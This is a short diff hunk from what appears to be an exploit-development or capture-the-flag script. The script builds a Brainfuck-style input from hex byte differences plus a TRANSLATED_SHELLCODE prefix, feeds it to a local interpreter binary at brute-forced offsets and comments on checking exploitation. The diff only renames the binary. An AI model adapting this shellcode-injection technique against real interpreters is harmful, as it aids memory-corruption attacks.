@@ -34,7 +34,7 @@ def main():
     # for position in [1131]:
         s = ['>' * position] + [((int(a[i], 16) - int(b[i], 16) + 256) % 256) * '-' + '>' for i in range(len(a))]
         res = TRANSLATED_SHELLCODE + ''.join(s)
-        print(('echo "" | ./bfexecutor "{}"'.format(res)))
+        print(('echo "" | ./bhexecutor "{}"'.format(res)))
         print('position:', position)
         # check exploitations here, break
 
